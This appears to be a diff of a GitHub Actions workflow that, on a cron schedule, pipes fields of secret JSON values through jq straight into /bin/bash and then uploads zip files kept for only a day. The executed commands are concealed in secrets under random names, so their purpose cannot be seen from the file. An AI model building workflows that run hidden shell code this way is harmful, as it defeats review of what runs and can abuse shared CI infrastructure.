@@ -1,27 +1,29 @@
 name: tongluhongdong
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '40 2/6 * * *'
 
-jobs:  # 29941
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tongluhongdong
         env:
-          zo612: ${{ secrets.zo612 }}
+          rv211: ${{ secrets.rv211 }}
         run: |
-          echo $zo612 | jq -r .hh7 | /bin/bash
-          echo $wcn22005 | jq -r .j31194 | /bin/bash
-          echo $ynssv9 | jq -r .xrn1 | /bin/bash
-          echo $v5 | jq -r .pfsue8 | /bin/bash
-          echo $lmids80 | jq -r .nm2 | /bin/bash
-          echo $tyzgu0589 | jq -r .b7309 | /bin/bash
-          echo $r870 | jq -r .seazn82856 | /bin/bash
-          echo $jr28558 | jq -r .o31994 | /bin/bash
-          echo $gf5 | jq -r .sabt7 | /bin/bash
+          printf '%s' "$rv211" | jq -r .zlg1 | /bin/bash
+          printf '%s' "$f4200" | jq -r .omeb5811 | /bin/bash
+          echo $xdkdc7 | jq -r .nnbv33 | /bin/bash
+          printf '%s' "$ttlz060" | jq -r .xbrr96427 | /bin/bash
+          echo $p80 | jq -r .feyw9003 | /bin/bash
+          echo $dgq66 | jq -r .vgj796 | /bin/bash
+          echo $syx1 | jq -r .cb01289 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: bYb502xG
+          path: "*.zip"
+          retention-days: 1
